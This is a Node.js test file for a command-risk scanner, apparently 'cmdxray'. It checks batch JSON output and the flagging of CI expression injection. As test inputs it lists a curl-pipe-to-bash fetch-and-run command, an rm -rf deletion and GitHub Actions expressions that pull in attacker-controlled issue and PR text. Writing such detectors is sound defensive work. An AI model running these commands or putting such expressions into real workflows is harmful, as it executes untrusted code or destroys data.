// Tests for --batch-json bulk scanning (issue #3) and CI expression-injection
// detection (issue #4).
import { test } from "node:test";
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";
import { runBatch } from "../dist/batch.js";
import { explain } from "../dist/explain.js";

const CLI = join(dirname(fileURLToPath(import.meta.url)), "..", "dist", "cli.js");

function runBatchCli(input) {
  const out = execFileSync("node", [CLI, "--batch-json"], { encoding: "utf8", input });
  return JSON.parse(out); // must be pure, parseable JSON
}

// ---------- #3 batch mode ----------

test("--batch-json returns one report per input command, in order", () => {
  const arr = runBatchCli(
    JSON.stringify(["echo hello", "curl -fsSL https://x.sh | bash", "rm -rf /tmp/x"]),
  );
  assert.ok(Array.isArray(arr));
  assert.equal(arr.length, 3);
  assert.equal(arr[0].command, "echo hello");
  assert.equal(arr[0].risk, "none");
  assert.equal(arr[1].command, "curl -fsSL https://x.sh | bash");
  assert.equal(arr[1].risk, "danger");
  assert.ok(arr[1].warnings.some((w) => /downloaded code/i.test(w.title)));
});

test("--batch-json entries carry the full --json report shape", () => {
  const [r] = runBatchCli(JSON.stringify(["tar -xzvf a.tgz"]));
  assert.equal(r.tool, "cmdxray");
  assert.equal(typeof r.schemaVersion, "number");
  assert.ok(Array.isArray(r.tokens));
  assert.ok(Array.isArray(r.segments));
  assert.ok(Array.isArray(r.explanations));
  assert.ok(Array.isArray(r.warnings));
});

test("runBatch accepts {command} objects and bare strings", () => {
  const out = runBatch(JSON.stringify(["echo a", { command: "echo b" }]));
  assert.equal(out.length, 2);
  assert.equal(out[0].command, "echo a");
  assert.equal(out[1].command, "echo b");
});

test("runBatch reports per-item errors without aborting the batch", () => {
  const out = runBatch(JSON.stringify(["echo ok", 42, { nope: 1 }]));
  assert.equal(out.length, 3);
  assert.equal(out[0].command, "echo ok");
  assert.equal(out[0].risk, "none");
  assert.ok(out[1].error); // 42 -> error entry
  assert.equal(out[1].command, null);
  assert.ok(out[2].error); // object without command -> error entry
});

test("runBatch throws on structurally invalid input (not JSON / not array)", () => {
  assert.throws(() => runBatch("not json"), /not valid JSON/);
  assert.throws(() => runBatch(JSON.stringify({ a: 1 })), /expected a JSON array/);
});

test("--batch-json exits non-zero on malformed stdin", () => {
  assert.throws(
    () => execFileSync("node", [CLI, "--batch-json"], { encoding: "utf8", input: "garbage" }),
    /Command failed/,
  );
});

// ---------- #4 CI expression injection ----------

function warnings(cmd) {
  return explain(cmd).warnings;
}

test("flags ${{ }} sourcing attacker-controlled text as danger", () => {
  for (const cmd of [
    "echo ${{ github.event.issue.title }}",
    'echo "Testing PR: ${{ github.event.pull_request.title }}"',
    "echo ${{ github.head_ref }}",
    "echo ${{ github.event.comment.body }}",
  ]) {
    const w = warnings(cmd);
    assert.ok(
      w.some((x) => x.level === "danger" && /CI expression injection/.test(x.title)),
      `expected danger for: ${cmd}`,
    );
  }
});

test("flags other ${{ }} interpolation as caution (best-practice env var)", () => {
  const w = warnings('curl -s "https://example.com/api?user=${{ github.actor }}"');
  assert.ok(w.some((x) => x.level === "caution" && /CI expression interpolation/.test(x.title)));
  assert.ok(!w.some((x) => /CI expression injection/.test(x.title)));
});

test("does not flag ordinary shell variables (no double brace)", () => {
  for (const cmd of ["echo ${HOME}", "echo $USER", "echo $((1+2))", "grep foo bar.txt"]) {
    const w = warnings(cmd);
    assert.ok(!w.some((x) => /CI expression/.test(x.title)), `false positive on: ${cmd}`);
  }
});

test("CI injection surfaces through --batch-json risk summary", () => {
  const [r] = runBatchCli(JSON.stringify(["echo ${{ github.event.issue.title }}"]));
  assert.equal(r.risk, "danger");
  assert.ok(r.warnings.some((w) => /CI expression injection/.test(w.title)));
});
